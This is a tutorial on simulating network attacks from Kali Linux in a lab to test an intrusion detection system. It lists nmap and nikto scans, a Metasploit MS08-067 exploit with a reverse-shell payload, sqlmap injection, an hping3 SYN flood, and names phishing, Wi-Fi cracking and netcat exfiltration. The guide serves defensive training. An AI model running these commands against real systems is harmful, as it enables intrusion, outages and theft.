Simulating a wide range of network attacks using Kali Linux in a laboratory environment is an effective way to learn about network's defenses and the responsiveness of your Intrusion Detection System (IDS). 
### 1. Reconnaissance and Scanning

- **Ping Sweep**:
  ```bash
  nmap -sn 192.168.1.0/24
  ```

- **TCP SYN Scan**:
  ```bash
  nmap -sS 192.168.1.105
  ```

- **TCP Connect Scan**:
  ```bash
  nmap -sT 192.168.1.105
  ```

- **UDP Scan**:
  ```bash
  nmap -sU 192.168.1.105
  ```

- **Stealthy Scan (Fragmented Packets)**:
  ```bash
  nmap -f 192.168.1.105
  ```

- **Aggressive Scan with OS and Service Detection**:
  ```bash
  nmap -A 192.168.1.105
  ```

- **Vulnerability Scanning (with tools like Nikto or OpenVAS)**:
  ```bash
  nikto -h 192.168.1.105
  ```

### 2. Exploitation and Attacks

- **Exploiting Known Vulnerabilities (using Metasploit)**:
  - Example for MS08-067:
    ```bash
    msfconsole
    use exploit/windows/smb/ms08_067_netapi
    set RHOST 192.168.1.105
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST [Kali IP]
    exploit
    ```

- **SQL Injection Simulation (using sqlmap)**:
  ```bash
  sqlmap -u "http://192.168.1.105/login.php" --forms --risk=3 --level=5
  ```

- **Cross-Site Scripting (XSS) Attack Simulation**:
  - Use XSSer or manually inject scripts into vulnerable web forms.

- **Denial of Service (DoS) Attacks**:
  ```bash
  hping3 --flood --rand-source --syn 192.168.1.105
  ```

- **Distributed Denial of Service (DDoS) Simulation** (be cautious with this):
  - Requires a controlled environment and multiple machines or VMs.

### 3. Wireless Network Attacks

- **Wi-Fi Network Cracking (WEP, WPA/WPA2)**:
  - Use tools like `aircrack-ng` for capturing and cracking Wi-Fi passwords.

- **Evil Twin Attack**:
  - Set up a rogue access point with the same SSID as a legitimate network.

### 4. Credential Harvesting and Phishing

- **Setting Up a Phishing Page**:
  - Use tools like `SEToolkit` to create and host a phishing page.

- **Password Cracking**:
  - Use `John the Ripper` or `hashcat` to crack weak passwords.

### 5. Post-Exploitation

- **Data Exfiltration**:
  - Simulate data theft using `nc` (netcat) or other tools to transfer data from the target system.

- **Lateral Movement**:
  - Simulate movement within a network to access other systems.

### 6. Evasion Techniques

- **Firewall and IDS Evasion**:
  - Use `nmap` scripting engine or other tools for evading detection.

### Monitoring and Analysis

- After each test, monitor the network and IDS logs for alerts.
- Use Kibana, Splunk, or other SIEM tools to analyze the impact and response.

### Important Considerations

- **Authorization**: Ensure you have explicit permission to test the network.
- **Controlled Environment**: Perform these tests in a controlled environment to avoid unintended consequences.
- **Legal and Ethical Compliance**: Stay within legal and ethical boundaries.
